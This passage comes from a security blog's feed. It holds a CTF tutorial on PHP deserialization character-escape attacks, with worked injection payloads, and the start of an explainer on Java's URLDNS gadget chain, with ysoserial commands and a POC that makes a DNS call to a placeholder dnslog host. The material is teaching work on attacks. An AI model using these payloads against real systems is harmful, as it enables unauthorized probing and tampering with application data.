        <content type="html"><![CDATA[<h1 id="PHP反序列化之字符逃逸"><a href="#PHP反序列化之字符逃逸" class="headerlink" title="PHP反序列化之字符逃逸"></a>PHP反序列化之字符逃逸</h1><blockquote><p>以前在学习PHP反序列化字符逃逸的时候，找不到合适的文章来加深我对它的理解，现在写一篇方便后续拿来快速回忆；我这里用例题详细讲解了PHP反序列化中字符逃逸漏洞中字符增加和字符减少的两种情况</p></blockquote><h2 id="字符增加"><a href="#字符增加" class="headerlink" title="字符增加"></a>字符增加</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/p/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;WW&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;10&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php过滤函数会把P替换成两个W,导致字符串长度改变，S的值对应不上字符串真实长度<br><code>i:0=username  i:1=age</code></p><p>例如<br><code>a:2:&#123;i:0;s:7:&quot;purplet&quot;;i:1;s:2:&quot;10&quot;&#125;</code>  -&gt;<br><code>a:2:&#123;i:0;s:7:&quot;WWurWWlet&quot;;i:1;s:2:&quot;10&quot;&#125;</code><br>a的值代表里面有两个数组、i代表第几个数组、s代表字符串长度和它的值</p><p>这样第一个数组  <code>i:0;s:7:&quot;WWurWWlet&quot;;</code>     字符串长度s的值还是7，但是其实是9，相当于只要传一个p,就会多出一个字符。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><p>这样的话就会出现一个思路：例如，如果我们给username传进去的值长度为32位，组合为16个p再加上16个任意字符，那么在经过filter函数过滤后，16个p就会变成32个W，这样就满足了刚刚在username传进去的32位，如下:<br><code>a:2:&#123;i:0;s:32:&quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW+16个其他字符&quot;;i:1;s:2:&quot;10&quot;&#125;</code></p></blockquote><p>这样的话就逃逸出16位字符，我们只需要加上一个双引号，就可以直接把  <code>s:32:&quot;32个W</code>   ,给闭合掉，再自己构造好<code>i:1</code>的age值并用<code>&#125;</code>把真正的<code>i:1</code>闭合掉即可。</p><p><strong>总结</strong><br>该思路仅为了方便理解，在实践时，应该提前构造好用来<strong>闭合</strong>的payload,再计算payload的总长度。<strong>闭合payload为16位是前因，传16个p是后果。</strong></p><p>传p的个数为：<br><strong>构造闭合payload的长度除以多出的字符数</strong></p><p>例如，闭合payload为16位，那么就传入username为16个p(p变成WW,增加一位字符串的情况)+16位的payload总共32位。</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>这道题的目的是把年龄10改成20</p><p>先构造好闭合payload<br><code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code><br>他的长度是16位，想要把他传进去并闭合掉后面的age的值，就需要在username里面传入构造好的poyload</p><p>由于上面已经说了，每传进去一个p就会多出一个字符，我们构造好的数组是16位，因此就要传16个p，payload如下，并从username中传入</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115416.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pppppppppppppppp&quot;;i:1;s:2:&quot;20&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到结果</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115755.png"></p><p><strong>逐步解读</strong></p><h4 id="正常没有过滤函数的序列化会变成如下"><a href="#正常没有过滤函数的序列化会变成如下" class="headerlink" title="正常没有过滤函数的序列化会变成如下"></a>正常没有过滤函数的序列化会变成如下</h4><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115621.png"><br>它s的32代表  <code>pppppppppppppppp&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>  ；16个p加上长度为16的  <code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code></p><h4 id="有过滤函数的序列化会变成如下"><a href="#有过滤函数的序列化会变成如下" class="headerlink" title="有过滤函数的序列化会变成如下"></a>有过滤函数的序列化会变成如下</h4><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115640.png"></p><p><code>pppppppppppppppp&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>  ——&gt;<code>WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW&quot;;i:1;s:2:&quot;20&quot;;&#125;</code></p><p>它s的32代表  32个W</p><p>32个W把S:32填充完毕，由于payload中p后边加上了双引号闭合，正好把i:0和i:1分开了，i:1就是我们传入的;i:1;s:2:”20”;}  。后面真正的i:1就被我们闭合掉了，就没有作用了</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115953.png"></p><h4 id="反序列化后的结果"><a href="#反序列化后的结果" class="headerlink" title="反序列化后的结果"></a>反序列化后的结果</h4><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115555.png"><br>这样就成功把age的值从10变成20了</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>这里的双引号其实就是i:0的，和真正的i:1都被闭合掉了</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321120042.png"></p><p>画横线的本质上是属于i:0 的  但是由于字符串增加了16位，总共48位<br><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321115953.png"><br>在反序列化过程中，由于S:32的限制 它只会从第一个W往后读32位就会结束，后面的就不管了，导致后面的;i:1;s:2:”20”;}被当成真的，并闭合掉了i:1;s:2:”10”}</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>遇到字符增加的反序列化</strong><br><strong>1.先判断增加了几个字符（一个p变成一个WW,增加了一个）</strong><br><strong>2.构造要传入payload长度（<code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>总共16位）</strong><br><strong>3.计算要传入字符(p)的个数</strong><br><strong>4.和p一块传入即可，需要注意要传到哪个参数。</strong></p><h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/pp/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;W&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;ppurlet&#x27;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&#x27;10&#x27;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><blockquote><p>如果字符增加，就让它填充，同理我们在username传p,如果字符减少，那就让它向后吞噬，把真正的<code>i:1</code>数组前半部分吞掉，再从age参数传入一个我们提前构造好的age数组，就可以完成字符逃逸。</p></blockquote><p>例如，在过滤函数过滤之前为，a:2:{i:0;s:7:”ppurlet”;i:1;s:2:”10”;}<br>过滤后变为  a:2:{i:0;s:7:”Wurlet”;i:1;s:2:”10”;}  而s:7:”Wurlet”中Wurlet长度是六位，在反序列化过程中，它就会继续往下读一位把单引号吃掉，因而导致了反序列化错误。</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321144858.png"></p><p>但是这也给我们引出了思路，在username参数多传几个p让s的值变大，从而继续往下吞噬。<br>因为还不确定要吞噬多少位，先随便传值看看</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321160102.png"></p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321160046.png"><br>可以看到我们只要把12位<code>&quot;;i:1;s:16:&quot;</code>吞噬掉，再给age参数传入一个我们新写好的i:1就可以了。</p><h4 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h4><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321160527.png"><br>这里的<code>&quot;;&#125;&quot;</code>不用管，后续会把它闭合掉</p><h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><p><strong>payload如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=pppppppppppppppppppppppp</span><br><span class="line">age=&quot;;i:1;s:2:&quot;20&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321162207.png"></p><h4 id="payload解读"><a href="#payload解读" class="headerlink" title="payload解读"></a>payload解读</h4><p><strong>传入24个p的原因</strong>：因为每传两个p就会吞噬掉一个字符，我们需要吞噬掉<code>&quot;;i:1;s:16:&quot;</code>总共十二个字符，因此传入24个p</p><p>age参数<code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>中写<code>&quot;;</code>的原因：用来闭合掉<code>s:24:&quot;</code>的双引号，分号后就是我们新写入的<code>i:1</code>了；最后面的花括号就是用来闭合前文注意点所提到的<code>a:2:&#123;</code>的。</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321161610.png"></p><p>这样传入并反序列化后就已经成功写了age的值了。</p><p>最终结果<br><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321162224.png"></p><h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><p>文章写到最后发现，其实我这里payload（”;i:1;s:2:”20”;}）中<strong>不用写双引号也行</strong>，前文是要吞噬掉<code>&quot;;i:1;s:16:&quot;</code>，我们只吞噬掉<code>&quot;;i:1;s:16:</code>也行，<strong>最后这个双引号留着，用来闭合S:24:”的双引号</strong>，这样就不用再age中写双引号了。</p><p>把p减少两个，并把age中的双引号删除</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321164052.png"></p><p>反序列化也能成功</p><p><img src="https://cdn.jjjxx.top/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20250321164153.png"></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>遇到字符减少时的反序列化</strong><br><strong>1.先判断减少了几个字符（两个p变成一个W,减少了一个）</strong><br><strong>2.找到需要吞掉字符串的长度(本例题是i:1的前大半部分)</strong><br><strong>3.计算要传入字符(p)的个数</strong><br><strong>4.构造好要修改的数组并传入即可，需要注意要传到哪个参数。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
            <tag> 字符逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化-URLDNS链详解</title>
      <link href="/2025/03/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E7%AF%87-URLDNS%E9%93%BE%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/03/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E7%AF%87-URLDNS%E9%93%BE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS链详解"><a href="#URLDNS链详解" class="headerlink" title="URLDNS链详解"></a>URLDNS链详解</h1><p>在了解反序列化链之前，应先了解Java的序列化、反序列化和Java的反射机制</p><h2 id="什么是-URLDNS"><a href="#什么是-URLDNS" class="headerlink" title="什么是 URLDNS"></a>什么是 URLDNS</h2><p><code>URLDNS</code> 是  <a href="https://github.com/frohoff/ysoserial/releases">ysoserial</a>提供的一个反序列化利用链，<strong>目的是无回显探测目标系统是否存在 Java 反序列化漏洞</strong>，是反序列化链中最简单的一条链，可以作为学习反序列化链的开始。<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318160030.png"></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>目标无回显，可控的参数只是个url，因此只能发起DNS请求探测是否存在反序列化漏洞。</li><li>不限制 jdk 版本，使用 Java 内置类且不依赖第三方库。</li></ul><h2 id="总体流程理解"><a href="#总体流程理解" class="headerlink" title="总体流程理解"></a>总体流程理解</h2><p>这里先提前说一下大体利用流程，方便后续理解。</p><p><strong>漏洞点</strong>:URLDNS的本质就是Java的反序列化漏洞，因此只要是<strong>能够反序列化用户传入的数据</strong>的功能点(接口、RMI、JNDI)或者可以上传<code>.ser</code>文件和带有序列化对象的文件的功能点；服务端解析后就可能触发反序列化漏洞。</p><p><strong>使用ysoserial的URELDNS链生成poyload：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#直接使用</span><br><span class="line">java -jar ysoserial.jar URLDNS http:<span class="comment">//你的dnslog地址  </span></span><br><span class="line">或者</span><br><span class="line">#生成序列化文件</span><br><span class="line">java -jar ysoserial.jar URLDNS http:<span class="comment">//你的dnslog地址  &gt; urldns.ser</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成后就可以在功能点测试，看看是否能收到DNS请求<br>也可以使用如下POC测试</p><p><strong>POC</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">nowTime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://你的DNSLOG地址&quot;</span>);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);  <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        filed.set(url, <span class="number">209</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">209</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间为: &quot;</span> + simpleDateFormat.format(nowTime));</span><br><span class="line">        filed.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashmap);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://www.freebuf.com/articles/web/327710.html  POC地址</span></span><br></pre></td></tr></table></figure><h2 id="ysoserial-URLDNS-payload代码解读"><a href="#ysoserial-URLDNS-payload代码解读" class="headerlink" title="ysoserial URLDNS payload代码解读"></a>ysoserial URLDNS payload代码解读</h2><p>看这条链之前，先解读一下ysoserial URLDNS 给出的payload源码<br><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">源码链接</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">                ht.put(u, url);</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码总共分两部分，一步步解读</p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">               </span><br><span class="line">               <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">               <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">               <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">               ht.put(u, url);</span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">               <span class="keyword">return</span> ht;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><ul><li>构造了一个 <code>HashMap</code>，以 <code>URL</code> 作为 key。</li><li><code>HashMap</code> 在反序列化的时候会执行 <code>put()</code>， <code>put()</code> 会调用 <code>key.hashCode()</code>。</li><li>通过反射构造的 <code>URL</code> 对象的 <code>hashCode()</code> 被重置为 <code>-1</code>，以便它会重新计算 <code>hashCode()</code>；重新计算 <code>hashCode()</code> 时，会调用 <code>handler.hashCode(URL)</code>，触发 DNS 查询<code>InetAddress.getByName()</code>），详情后续会讲。</li></ul><h4 id="hashmap介绍"><a href="#hashmap介绍" class="headerlink" title="hashmap介绍"></a>hashmap介绍</h4><p><code>HashMap</code> 是 <strong>Java</strong> 中非常常用的一个数据结构，本质上是<strong>基于哈希表（Hash Table）实现的键值对（key-value）集合</strong>。</p><p><code>HashMap</code> 是一个 <strong>存储“键值对”映射关系</strong> 的集合类。<br>你可以通过一个 <strong>键（Key）</strong> 快速查找对应的 <strong>值（Value）</strong>。</p><p>就像你有一个“字典”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Key（单词）：      &quot;apple&quot;</span><br><span class="line">Value（释义）：   &quot;苹果&quot;</span><br></pre></td></tr></table></figure><p>用 <code>HashMap</code> 